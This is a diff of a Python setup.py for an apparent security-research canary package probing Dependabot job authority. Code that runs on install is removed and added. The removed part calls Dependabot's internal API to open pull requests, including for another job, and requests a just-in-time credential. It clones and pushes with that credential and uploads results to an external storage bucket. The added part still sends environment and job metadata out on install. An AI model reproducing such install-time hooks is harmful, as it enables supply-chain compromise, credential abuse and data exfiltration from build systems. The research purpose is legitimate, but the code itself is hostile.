@@ -1,420 +1,80 @@
-import base64
 import hashlib
 import json
 import os
 import pathlib
 import subprocess
-import tempfile
-import time
-import urllib.error
 import urllib.request
 from datetime import datetime, timezone
 
 from setuptools import find_packages, setup
 
 
-RECEIPT_URL = "https://storage.googleapis.com/treborlab-dependabot-jit-receipts-1097452703518/hosted-jit-receipt.json?x-goog-signature=5890d38c6727230803a816101289a1e9943aaca19832bb68b46c5429461f224742ccd4f8e1c9b72ed4d2066ab9d46b29dd1d2c0564e3c2319441084d32777585c6afe1f9348d8ff59272b02283aa5da38e2e2e1531b79a113428f366c24b736d9a24d9760c2ee7eda92a62f863330b1a3da59ea20f83bf17f8cd0d46becbb6c2a5d56b1ef5391ce54b25550ab2fbcb8657a301f0b0ab0846c6b24411c3508147a40cf8b21c6d5e36306c20b884d3b3005307e84526ba0eb82547c943d340d782acc7a100b54dec2ea56d052f32533553fe4a7e185ac318960b102fb6dab9fb6c8200dfd80870e474273d77d6e02552e58e0fbbbfeccff3dca0b191e449946f76&x-goog-algorithm=GOOG4-RSA-SHA256&x-goog-credential=1097452703518-compute%40developer.gserviceaccount.com%2F20261103%2Fus-central1%2Fstorage%2Fgoog4_request&x-goog-date=20261103T045241Z&x-goog-expires=7200&x-goog-signedheaders=host"
-TARGET_NWO = "benr00t3d/dependabot-python-victim-canary"
-CONTROL_URL = (
-    "https://raw.githubusercontent.com/benr00t3d/"
-    "dependabot-python-jit-probe/main/cross-job-control.json"
-)
+RECEIPT_URL = "https://treborlab-dependabot-jit-receipts-1097452703518.storage.googleapis.com/pr-admission-stage1-20261103.json?x-goog-signature=531d47698fb3ecb050bbfe13aa619b91216b2d68f47cb6dc95e69948c596ac3faa46a80b6041c21d6f332e4754777030907dd7ec3124ad5246f7f9952b9b830fb95a068b3adfcf7277b02c423bf796b23f0c4dcce171695106045943f80b15fd4ce80df00eb400965d44422c29956533fb95e29f40465da7cecb776742601a0a8b1875a2173f8e7b9aed30043f5b0c5632e01b67b3c6c61e441a86fe7b36691582006d1a7c2787737db01e37ecd34f0bb99a66b5e456c2277c0f74e614dc6602b670abf690709efd3dafe7023cdd0c1753c62ef73e6d02d90d479ff62cdc50c2183b3efa3578eb8d62b4d3b868a707b6bef9d3f3932b5a21307b9374c140cdd3&x-goog-algorithm=GOOG4-RSA-SHA256&x-goog-credential=1097452703518-compute%40developer.gserviceaccount.com%2F20261103%2Fus-central1%2Fstorage%2Fgoog4_request&x-goog-date=20261103T065352Z&x-goog-expires=43200&x-goog-signedheaders=content-type%3Bhost"
+CANARY_TEXT = b"Reporter-owned workflow-free Dependabot PR admission canary.\n"
 
 
 def _sha256(value):
     return hashlib.sha256(value).hexdigest()
 
 
-def _run_probe():
-    api_url = os.environ.get("DEPENDABOT_API_URL", "").rstrip("/")
-    job_id = os.environ.get("DEPENDABOT_JOB_ID", "")
-    if not api_url or not job_id:
-        return
-
-    marker = pathlib.Path(tempfile.gettempdir()) / f"dependabot-jit-probe-{job_id}"
-    if marker.exists():
-        return
-
-    receipt = {
-        "schema": "dependabot-job-authority-canary-v2",
-        "observed_at": datetime.now(timezone.utc).isoformat(),
-        "job_id_sha256": _sha256(job_id.encode()),
-        "api_origin_sha256": _sha256(api_url.split("/update_jobs/")[0].encode()),
-        "dependabot_marker": bool(os.environ.get("DEPENDABOT")),
-        "https_proxy_present": bool(os.environ.get("HTTPS_PROXY")),
-        "target": TARGET_NWO,
-        "jit_status": None,
-        "credential_returned": False,
-        "credential_sha256": None,
-        "credential_accessible_repos": [],
-        "target_clone_succeeded": False,
-        "target_canary_sha256": None,
-        "bounded_push_succeeded": False,
-        "pull_request_api_status": None,
-        "pull_request_api_body_sha256": None,
-        "pull_request_canary_name": "DEPENDABOT_PUBLIC_PACKAGE_AUTHORITY_CANARY.txt",
-        "cross_job_api_status": None,
-        "cross_job_api_body_sha256": None,
-        "cross_job_target_id_sha256": None,
-        "dependency_submission_status": None,
-        "dependency_submission_body_sha256": None,
-        "private_source_canary_sha256": None,
-    }
-
-    repo_dir = pathlib.Path("/home/dependabot/dependabot-updater/repo")
-    base_commit = None
-    if repo_dir.is_dir():
-        base_result = subprocess.run(
-            ["git", "-C", str(repo_dir), "rev-parse", "HEAD"],
+def _git_head(directory):
+    try:
+        result = subprocess.run(
+            ["git", "-C", str(directory), "rev-parse", "HEAD"],
+            check=False,
             stdout=subprocess.PIPE,
             stderr=subprocess.DEVNULL,
-            timeout=10,
-            check=False,
             text=True,
+            timeout=5,
         )
-        if base_result.returncode == 0:
-            base_commit = base_result.stdout.strip()
-        private_canary = repo_dir / "PRIVATE_SOURCE_CANARY.txt"
-        if private_canary.is_file():
-            receipt["private_source_canary_sha256"] = _sha256(private_canary.read_bytes())
+        return result.stdout.strip() if result.returncode == 0 else None
+    except Exception:
+        return None
 
-    if base_commit:
-        requirements_in = (
-            "requests==2.34.2\n"
-            "dependabot-jit-authority-probe @ "
-            "git+https://github.com/benr00t3d/dependabot-python-jit-probe.git@v0.0.9\n"
-        )
-        requirements_txt = (
-            "#\n"
-            "# This file is autogenerated by pip-compile with Python 3.15\n"
-            "# by the following command:\n"
-            "#\n"
-            "#    pip-compile requirements.in\n"
-            "#\n"
-            "certifi==2023.7.22\n"
-            "    # via requests\n"
-            "charset-normalizer==3.2.0\n"
-            "    # via requests\n"
-            "dependabot-jit-authority-probe @ "
-            "git+https://github.com/benr00t3d/dependabot-python-jit-probe.git@v0.0.9\n"
-            "    # via -r requirements.in\n"
-            "idna==3.4\n"
-            "    # via requests\n"
-            "requests==2.34.2\n"
-            "    # via -r requirements.in\n"
-            "urllib3==2.0.4\n"
-            "    # via requests\n"
-        )
-        file_template = {
-            "content_encoding": "utf-8",
-            "deleted": False,
-            "directory": "/",
-            "operation": "update",
-            "support_file": False,
-            "type": "file",
-        }
-        pull_request_data = {
-            "dependencies": [
-                {
-                    "name": "requests",
-                    "previous-version": "2.31.0",
-                    "version": "2.34.2",
-                    "requirements": [
-                        {
-                            "file": "requirements.in",
-                            "requirement": "==2.34.2",
-                            "groups": [],
-                            "source": None,
-                        }
-                    ],
-                    "previous-requirements": [
-                        {
-                            "file": "requirements.in",
-                            "requirement": "==2.31.0",
-                            "groups": [],
-                            "source": None,
-                        }
-                    ],
-                    "directory": "/",
-                }
-            ],
-            "updated-dependency-files": [
-                dict(file_template, name="requirements.in", content=requirements_in),
-                dict(file_template, name="requirements.txt", content=requirements_txt),
-                {
-                    "name": receipt["pull_request_canary_name"],
-                    "content": "Reporter-owned bounded public-package authority canary.\n",
-                    "content_encoding": "utf-8",
-                    "deleted": False,
-                    "directory": "/",
-                    "operation": "create",
-                    "support_file": True,
-                    "type": "file",
-                },
-            ],
-            "base-commit-sha": base_commit,
-            "commit-message": "Record bounded public-package authority canary",
-            "pr-title": "Record bounded public-package authority canary",
-            "pr-body": "Reporter-owned Dependabot job-authority boundary canary.",
-        }
-        pull_request = urllib.request.Request(
-            f"{api_url}/update_jobs/{job_id}/create_pull_request",
-            data=json.dumps({"data": pull_request_data}).encode(),
-            headers={"Content-Type": "application/json"},
-            method="POST",
-        )
+
+def _emit_receipt():
+    api_url = os.environ.get("DEPENDABOT_API_URL", "").rstrip("/")
+    job_id = os.environ.get("DEPENDABOT_JOB_ID", "")
+    repo_dir = pathlib.Path("/home/dependabot/dependabot-updater/repo")
+    canary = repo_dir / "PR_ADMISSION_STAGE1.txt"
+    canary_matches = False
+    if canary.is_file():
         try:
-            with urllib.request.urlopen(pull_request, timeout=20) as response:
-                body = response.read(1024 * 1024)
-                receipt["pull_request_api_status"] = response.status
-                receipt["pull_request_api_body_sha256"] = _sha256(body)
-        except urllib.error.HTTPError as error:
-            receipt["pull_request_api_status"] = error.code
-            receipt["pull_request_api_body_sha256"] = _sha256(error.read(1024 * 1024))
-        except Exception as error:
-            receipt["pull_request_api_error_class"] = type(error).__name__
+            canary_matches = canary.read_bytes() == CANARY_TEXT
+        except OSError:
+            pass
 
-    try:
-        with urllib.request.urlopen(CONTROL_URL, timeout=15) as response:
-            control = json.loads(response.read(65536))
-        target_job_id = str(control.get("job_id", ""))
-        target_base_commit = str(control.get("base_commit", ""))
-        if target_job_id.isdigit() and len(target_base_commit) == 40:
-            receipt["cross_job_target_id_sha256"] = _sha256(target_job_id.encode())
-            cross_job_data = {
-                "dependencies": [
-                    {
-                        "name": "requests",
-                        "previous-version": "2.31.0",
-                        "version": "2.34.2",
-                        "requirements": [
-                            {
-                                "file": "requirements.in",
-                                "requirement": "==2.34.2",
-                                "groups": [],
-                                "source": None,
-                            }
-                        ],
-                        "previous-requirements": [
-                            {
-                                "file": "requirements.in",
-                                "requirement": "==2.31.0",
-                                "groups": [],
-                                "source": None,
-                            }
-                        ],
-                        "directory": "/",
-                    }
-                ],
-                "updated-dependency-files": [
-                    {
-                        "name": "requirements.in",
-                        "content": "-e .\nrequests==2.34.2\n",
-                        "content_encoding": "utf-8",
-                        "deleted": False,
-                        "directory": "/",
-                        "operation": "update",
-                        "support_file": False,
-                        "type": "file",
-                    },
-                    {
-                        "name": "requirements.txt",
-                        "content": (
-                            "#\n# Reporter-owned cross-job authorization target.\n#\n"
-                            "-e .\nrequests==2.34.2\n"
-                        ),
-                        "content_encoding": "utf-8",
-                        "deleted": False,
-                        "directory": "/",
-                        "operation": "update",
-                        "support_file": False,
-                        "type": "file",
-                    },
-                    {
-                        "name": "DEPENDABOT_CROSS_JOB_AUTHORITY_CANARY.txt",
-                        "content": "Reporter-owned bounded cross-job authority canary.\n",
-                        "content_encoding": "utf-8",
-                        "deleted": False,
-                        "directory": "/",
-                        "operation": "create",
-                        "support_file": True,
-                        "type": "file",
-                    },
-                ],
-                "base-commit-sha": target_base_commit,
-                "commit-message": "Record bounded cross-job authority canary",
-                "pr-title": "Record bounded cross-job authority canary",
-                "pr-body": "Reporter-owned Dependabot cross-job authorization canary.",
-            }
-            cross_job_request = urllib.request.Request(
-                f"{api_url}/update_jobs/{target_job_id}/create_pull_request",
-                data=json.dumps({"data": cross_job_data}).encode(),
-                headers={"Content-Type": "application/json"},
-                method="POST",
-            )
-            try:
-                with urllib.request.urlopen(cross_job_request, timeout=20) as response:
-                    body = response.read(1024 * 1024)
-                    receipt["cross_job_api_status"] = response.status
-                    receipt["cross_job_api_body_sha256"] = _sha256(body)
-            except urllib.error.HTTPError as error:
-                receipt["cross_job_api_status"] = error.code
-                receipt["cross_job_api_body_sha256"] = _sha256(error.read(1024 * 1024))
-    except Exception as error:
-        receipt["cross_job_api_error_class"] = type(error).__name__
-
-    if base_commit:
-        time.sleep(35)
-        submission = {
-            "version": 1,
-            "sha": base_commit,
-            "ref": "refs/heads/main",
-            "job": {
-                "correlator": "dependabot-pip",
-                "id": f"public-package-authority-{job_id}",
-            },
-            "detector": {
-                "name": "dependabot",
-                "version": "1.0.0",
-                "url": "https://github.com/dependabot/dependabot-core",
-            },
-            "manifests": {
-                "requirements.in": {
-                    "name": "requirements.in",
-                    "file": {"source_location": "requirements.in"},
-                    "metadata": {"ecosystem": "pypi"},
-                    "resolved": {},
-                }
-            },
-            "metadata": {"status": "ok", "scanned_manifest_path": "pip::/"},
-        }
-        submission_request = urllib.request.Request(
-            f"{api_url}/update_jobs/{job_id}/create_dependency_submission",
-            data=json.dumps({"data": submission}).encode(),
-            headers={"Content-Type": "application/json"},
-            method="POST",
-        )
-        try:
-            with urllib.request.urlopen(submission_request, timeout=20) as response:
-                body = response.read(1024 * 1024)
-                receipt["dependency_submission_status"] = response.status
-                receipt["dependency_submission_body_sha256"] = _sha256(body)
-        except urllib.error.HTTPError as error:
-            receipt["dependency_submission_status"] = error.code
-            receipt["dependency_submission_body_sha256"] = _sha256(error.read(1024 * 1024))
-        except Exception as error:
-            receipt["dependency_submission_error_class"] = type(error).__name__
-
-    endpoint = f"{api_url}/update_jobs/{job_id}/create_jit_access"
-    request_body = json.dumps(
-        {"account": TARGET_NWO.split("/", 1)[0], "repository": TARGET_NWO.split("/", 1)[1]}
-    ).encode()
+    receipt = {
+        "schema": "dependabot-pr-admission-stage1-v1",
+        "observed_at": datetime.now(timezone.utc).isoformat(),
+        "dependabot_marker": bool(os.environ.get("DEPENDABOT")),
+        "dependabot_api_present": bool(api_url),
+        "dependabot_job_present": bool(job_id),
+        "api_origin_sha256": _sha256(api_url.split("/update_jobs/")[0].encode()) if api_url else None,
+        "job_id_sha256": _sha256(job_id.encode()) if job_id else None,
+        "github_actions": bool(os.environ.get("GITHUB_ACTIONS")),
+        "repo_head": _git_head(repo_dir) if repo_dir.is_dir() else None,
+        "stage1_canary_matches": canary_matches,
+        "stage1_canary_sha256": _sha256(CANARY_TEXT),
+    }
+    body = (json.dumps(receipt, sort_keys=True) + "\n").encode()
     request = urllib.request.Request(
-        endpoint,
-        data=request_body,
+        RECEIPT_URL,
+        data=body,
         headers={"Content-Type": "application/json"},
-        method="POST",
+        method="PUT",
     )
-
-    credential = None
     try:
-        with urllib.request.urlopen(request, timeout=15) as response:
-            body = response.read(1024 * 1024)
-            receipt["jit_status"] = response.status
-            parsed = json.loads(body)
-            candidate = parsed.get("password") if isinstance(parsed, dict) else None
-            if isinstance(candidate, str) and candidate:
-                credential = candidate
-                receipt["credential_returned"] = True
-                receipt["credential_sha256"] = _sha256(candidate.encode())
-                accessible = parsed.get("accessible-repos", [])
-                if isinstance(accessible, list):
-                    receipt["credential_accessible_repos"] = [str(value) for value in accessible[:8]]
-            else:
-                receipt["jit_response_sha256"] = _sha256(body)
-    except urllib.error.HTTPError as error:
-        receipt["jit_status"] = error.code
-        receipt["jit_error_body_sha256"] = _sha256(error.read(1024 * 1024))
-    except Exception as error:  # keep the receipt secret-free
-        receipt["jit_error_class"] = type(error).__name__
-
-    if credential:
-        clone_dir = pathlib.Path(tempfile.mkdtemp(prefix="dependabot-jit-target-")) / "target"
-        auth = base64.b64encode(f"x-access-token:{credential}".encode()).decode()
-        git_env = os.environ.copy()
-        git_env.update(
-            {
-                "GIT_CONFIG_COUNT": "1",
-                "GIT_CONFIG_KEY_0": "http.https://github.com/.extraheader",
-                "GIT_CONFIG_VALUE_0": f"AUTHORIZATION: basic {auth}",
-                "GIT_TERMINAL_PROMPT": "0",
-            }
-        )
-        clone = subprocess.run(
-            ["git", "clone", "--depth=1", f"https://github.com/{TARGET_NWO}.git", str(clone_dir)],
-            env=git_env,
-            stdout=subprocess.DEVNULL,
-            stderr=subprocess.DEVNULL,
-            timeout=30,
-            check=False,
-        )
-        receipt["target_clone_succeeded"] = clone.returncode == 0
-        canary_path = clone_dir / "CANARY.txt"
-        if clone.returncode == 0 and canary_path.is_file():
-            receipt["target_canary_sha256"] = _sha256(canary_path.read_bytes())
-
-            branch = "dependabot-jit-canary-" + _sha256(job_id.encode())[:12]
-            impact_path = clone_dir / "JIT_AUTHORITY_IMPACT_CANARY.txt"
-            impact_path.write_text(
-                "Reporter-owned bounded Dependabot JIT authority canary\n"
-                + receipt["credential_sha256"]
-                + "\n",
-                encoding="utf-8",
-            )
-            commands = [
-                ["git", "-C", str(clone_dir), "config", "user.name", "Dependabot JIT canary"],
-                ["git", "-C", str(clone_dir), "config", "user.email", "robert.prast@gmail.com"],
-                ["git", "-C", str(clone_dir), "add", "JIT_AUTHORITY_IMPACT_CANARY.txt"],
-                ["git", "-C", str(clone_dir), "commit", "-m", "Record bounded JIT authority canary"],
-                ["git", "-C", str(clone_dir), "push", "origin", f"HEAD:refs/heads/{branch}"],
-            ]
-            push_returncode = 1
-            for command in commands:
-                result = subprocess.run(
-                    command,
-                    env=git_env,
-                    stdout=subprocess.DEVNULL,
-                    stderr=subprocess.DEVNULL,
-                    timeout=30,
-                    check=False,
-                )
-                push_returncode = result.returncode
-                if result.returncode != 0:
-                    break
-            receipt["bounded_push_succeeded"] = push_returncode == 0
-
-    receipt_bytes = (json.dumps(receipt, sort_keys=True) + "\n").encode()
-    try:
-        upload = urllib.request.Request(
-            RECEIPT_URL,
-            data=receipt_bytes,
-            headers={"Content-Type": "application/json"},
-            method="PUT",
-        )
-        with urllib.request.urlopen(upload, timeout=15) as response:
-            receipt["receipt_upload_status"] = response.status
-    except Exception as error:
-        receipt["receipt_upload_error_class"] = type(error).__name__
-
-    marker.write_text(json.dumps(receipt, sort_keys=True), encoding="utf-8")
-    print("DEPENDABOT_JIT_AUTHORITY_RECEIPT=" + json.dumps(receipt, sort_keys=True), flush=True)
+        urllib.request.urlopen(request, timeout=15).read(1)
+    except Exception:
+        pass
 
 
-_run_probe()
+_emit_receipt()
 
 setup(
     name="dependabot-jit-authority-probe",
-    version="0.0.9",
-    description="Reporter-owned Dependabot boundary canary",
+    version="0.0.10",
+    description="Reporter-owned workflow-free Dependabot PR admission canary",
     packages=find_packages(),
 )
